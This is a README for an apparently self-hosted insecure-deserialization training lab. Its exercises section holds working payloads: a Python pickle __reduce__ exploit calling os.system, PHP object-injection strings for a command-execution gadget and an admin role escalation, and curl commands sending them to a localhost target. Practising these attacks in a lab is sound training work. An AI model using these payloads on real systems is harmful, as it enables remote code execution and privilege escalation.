# Insecure Deserialization Lab

## Overview

Practice exploiting object deserialization flaws and environment parser injections (PortSwigger Web Security Academy topic 17).

- **Default Port / Access**: `http://localhost:8095`
- **Container Name**: `cyberlab_web_deserialization`
- **Shortcut**: `./lab start deserialization`

---

## Lab Architecture & Endpoints

The target container hosts a dual-vulnerability service featuring authentic Python Pickle deserialization and PHP Object Injection:

| Endpoint       | Target Technology       | Mechanism / Vector                                          |
| :------------- | :---------------------- | :---------------------------------------------------------- |
| `GET /`        | Web UI Dashboard        | Interactive testing console with preloaded exploit payloads |
| `POST /pickle` | Python 3 `pickle.loads` | Form/JSON `data` or `Cookie: session=<base64>`              |
| `POST /php`    | PHP 8.x `unserialize`   | Form/JSON `data` or `Cookie: php_session=<payload>`         |

---

## Practice Exercises

### 1. Python Pickle Deserialization

Craft malicious `__reduce__` payloads executing arbitrary system calls against `pickle.loads()`:

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("Base64 Payload:", payload)
```

**Verification via Curl**:

```bash
curl -X POST http://localhost:8095/pickle \
     -d "data=gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="
```

### 2. PHP Object Injection

Test PHP `unserialize()` gadget chains using standard object injection or `PHPGGC`.

Available Server Gadgets:

- `UserProfile`: Modify `$role` to `'admin'` to trigger privilege escalation.
- `CommandExec`: Invokes `$this->command` in magic method `__destruct()`.
- `FileViewer`: Reads and returns `$this->filepath` in `__wakeup()`.

**Verification via Curl (CommandExec RCE Gadget)**:

```bash
curl -X POST http://localhost:8095/php \
     -d 'data=O:11:"CommandExec":1:{s:7:"command";s:18:"cat /flag.txt; id;";}'
```

**Verification via Curl (Admin Privilege Escalation)**:

```bash
curl -X POST http://localhost:8095/php \
     -d 'data=O:11:"UserProfile":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}'
```

### 3. Java Deserialization (ysoserial)

Generating CommonsCollections / Spring payloads against serialized stream headers (`rO0AB...`).

---

## YouTube Walkthroughs & Solving Guides

- [eshanshb - Modifying Serialized Objects (PortSwigger Labs)](https://www.youtube.com/watch?v=ew-fnre3bl0)
- [eshanshb - Modifying Serialized Data Types (PortSwigger Labs)](https://www.youtube.com/watch?v=j082gL5o5yQ)
